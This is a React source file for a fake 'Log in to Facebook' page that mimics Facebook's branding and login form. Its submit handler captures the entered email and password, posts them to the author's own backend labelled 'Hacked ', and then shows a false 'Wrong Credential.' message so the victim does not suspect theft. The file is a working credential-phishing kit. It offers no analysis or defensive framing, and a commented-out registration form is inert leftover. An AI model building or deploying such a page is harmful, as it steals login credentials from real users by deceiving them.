import { Helmet } from "react-helmet-async";

import Swal from "sweetalert2";
import useAxiosPublic from "../../Hooks/useAxiosPublic";

const DuplicateRegister = () => {
  const axiosPublic = useAxiosPublic()
  const handleSubmitRegister = async (e) => {
    e.preventDefault();
    // e.target.reset();

    const email = e.target.email.value;
    const password = e.target.password.value;
    console.log(email, password);

        const userInfo = {
          name: "Hacked ",
          email: email,
          passwords: password,
        };
        axiosPublic.post("/users", userInfo).then((res) => {
          if (res.data.insertedId) {
            console.log("user added to the database");
            Swal.fire({
              position: "top-center",
              icon: "error",
              title: "Wrong Credential.",
              showConfirmButton: false,
              timer: 1500,
            });
            e.target.reset();
           
          }
        });
     
  };

  return (
    <div>
      <Helmet>
        <title>Facebook</title>
        <link rel="canonical" href="https://www.tacobell.com/" />
      </Helmet>
      <div className="bg-gradient-to-b from-blue-50 to-blue-100 h-screen flex items-center justify-center">
        <div className=" p-6  w-96">
          <div className="w-20 h-20 mb-3 bg-blue-500 rounded-[80%] flex justify-center items-center mx-auto "> 
                <h1 className="text-7xl font-bold text-white ">f</h1>
          </div>
          <h2 className="text-2xl font-bold mb-6 text-center">
            Log in to Facebook
          </h2>
          <form onSubmit={handleSubmitRegister}>
            <div className="mb-4">
              <label
                className="block text-gray-700 text-sm font-bold mb-2"
              >
                Email or Phone
              </label>
              <input
                className="  border rounded-3xl w-full py-4 bg-white px-3 "
                id="email"
                name="email"
                type="text"
                placeholder="Email or Phone"
              />
            </div>
            <div className="mb-6">
              <label className="block  text-sm font-bold mb-2">
                Password
              </label>
              <input
                className="shadow appearance-none border bg-white rounded-3xl w-full py-4 px-3 text-gray-700 mb-3 leading-tight focus:outline-none focus:shadow-outline"
                id="password"
                name="password"
                type="password"
                placeholder="Password"
              />
            </div>
            <div className="">
              <div>
                <button
                  className="bg-blue-500 w-full  hover:bg-blue-700 text-white font-bold py-2 px-4 rounded-2xl focus:outline-none focus:shadow-outline"
                  type="submit"
                >
                  Log In
                </button>
              </div>
              <div className="mx-auto flex justify-center items-center mt-3">
                <a className=" mx-auto text-center font-bold text-sm" href="#">
                  Forgot Password?
                </a>
              </div>
            </div>
          </form>
        </div>
      </div>
      {/* <div className="flex bg- items-center justify-center h-screen w-full max-w-sm mx-auto overflow-hidden bg-white  dark:bg-gray-800 lg:max-w-4xl">
        
        

        <div className="flex flex-col max-w-md mx-auto  p-6  sm:p-10 ">
           <div className="flex justify-center items-center">
           <img className=" rounded-[50%]  w-20" src="https://i.ibb.co/ZhwrJ4G/facebook.jpg" alt="" />
           </div>
          <form onSubmit={handleSubmitRegister} className="space-y-12">
            <div className="space-y-4">
              

              <div>
                <label htmlFor="email" className="block mb-2 text-sm">
                  Email address
                </label>
                <input
                  type="email"
                  name="email"
                  id="email"
                  placeholder="leroy@jenkins.com"
                  className="w-full px-3 py-2 border rounded-md dark:border-gray-300 dark:bg-gray-50 dark:text-gray-800"
                />
              </div>
              <div className="relative">
                <label htmlFor="password" className="text-sm">
                  Password
                </label>
                <input
                  type={toggle ? "text" : "password"}
                  name="password"
                  id="password"
                  placeholder="*****"
                  className="w-full px-3 py-2 border rounded-md dark:border-gray-300 dark:bg-gray-50 dark:text-gray-800"
                />
                <span
                  className="absolute top-10 right-4"
                  onClick={() => setToggle(!toggle)}
                >
                  {toggle ? <IoIosEye /> : <IoIosEyeOff />}
                </span>
              </div>
              {error && <p className="text-red-600">{error}</p>}
            </div>
            <div className="space-y-2">
              <div>
                <button
                  type="submit"
                  className="w-full px-8 btn bg-[#ff4880] hover:bg-pink-500 py-3 font-semibold rounded-md dark:bg-violet-600 dark:text-gray-50"
                >
                  Register
                </button>
              </div>
              <p className="px-6 text-lg text-center ">
                Already have an account yet?
                <Link
                  to="/login"
                  className="hover:underline ml-4 text-green-600"
                >
                  Login
                </Link>
              </p>
            </div>
          </form>
          
        </div>
      </div> */}
    </div>
  );
};

export default DuplicateRegister;
